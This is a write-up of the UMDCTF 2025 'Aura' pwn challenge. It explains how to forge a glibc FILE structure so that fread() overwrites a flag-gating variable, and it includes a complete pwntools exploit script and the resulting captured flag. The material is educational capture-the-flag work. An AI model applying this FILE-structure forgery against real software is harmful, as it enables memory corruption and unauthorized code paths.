---
title: "Aura 🌟 – FILE Structure Forgery Exploit (UMDCTF 2025)"
tags: [CTF, binary exploitation, FILE Structure Forgery, pwn]
---

# UMDCTF 2025 - Aura Pwn Challenge Writeup 🌟
**Author:** [@notagain_pwn](https://github.com/notagain-pwn) (RaptX team)

![CTF](https://img.shields.io/badge/CTF-UMDCTF_2025-blue)
![Challenge](https://img.shields.io/badge/Challenge-Aura-informational)
![Category](https://img.shields.io/badge/Category-Pwn-red)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)

## Table of Contents 📚
- [Challenge Overview](#challenge-overview-) 📄
- [Introduction](#introduction-) 🎯
- [Source Code Analysis](#source-code-analysis-) 🔍
- [Exploitation Plan](#exploitation-plan-) 🛠️
- [Exploit Script](#exploit-script-) 🧠
- [Result](#result-) 🏆
- [Final Notes](#final-notes-) ✨

## Challenge Overview 📄

- **Binary:** aura (ELF 64-bit)

**Protections:**
```
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
Stripped: No
```

## Introduction 🎯

We are given a binary `aura`. When executed, it leaks a heap address ("aura") and expects us to submit a crafted structure.  
The goal is to forge a fake FILE structure and leverage `fread()` to overwrite "aura" into a non-zero value.

## Source Code Analysis 🔍

```c
// Main relevant parts
printf("my aura: %p\nur aura? ", &aura);
FILE *pFVar1 = fopen("/dev/null", "r");
read(0, pFVar1, 0x100);
fread(local_118, 1, 8, pFVar1);

if (aura == 0) {
    puts("u have no aura.");
} else {
    pFVar1 = fopen("flag.txt", "r");
    fread(local_138, 1, 0x11, pFVar1);
    printf("%s\n", local_138);
}
```

## Exploitation Plan 🛠️

1. Leak the heap address of `aura`.
2. Forge a valid `_IO_FILE` structure where:
    - `_IO_buf_base = aura`
    - `_IO_buf_end = aura + 0x10`
3. Overwrite "aura" with any non-zero bytes via `fread()`.
4. Access "flag.txt"!

## Exploit Script 🧠

```python
from pwn import *
import argparse

def connect(host=None, port=None):
    return remote(host, port) if host and port else process('./aura')

def leak_aura(p):
    p.recvuntil(b'my aura: ')
    return int(p.recvline().strip(), 16)

def forge_payload(aura_addr):
    payload  = p64(0) * 7
    payload += p64(aura_addr) + p64(aura_addr + 0x10)
    payload = payload.ljust(0x88, b' ')
    payload += p64(aura_addr)
    return payload

def exploit(p):
    aura = leak_aura(p)
    p.recvuntil(b'ur aura? ')
    p.send(forge_payload(aura))
    p.sendline(b'A'*8)
    p.interactive()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str)
    parser.add_argument('--port', type=int)
    args = parser.parse_args()
    p = connect(args.host, args.port)
    exploit(p)

if __name__ == '__main__':
    main()
```

## Result 🏆

```bash
$ python3 aura.py --host challs.umdctf.io --port 31006
[+] Leaked aura address: 0x58cc312f908c
[*] Sending forged FILE structure
[*] Overwriting aura value
[*] Switching to interactive mode
UMDCTF{+100aur4}
```

## Final Notes ✨

This challenge introduces basic but fun FILE structure manipulation, similar to concepts seen in "House of Orange" style heap exploitation.

🔙 [Back to UMDCTF 2025 Writeups](../../)
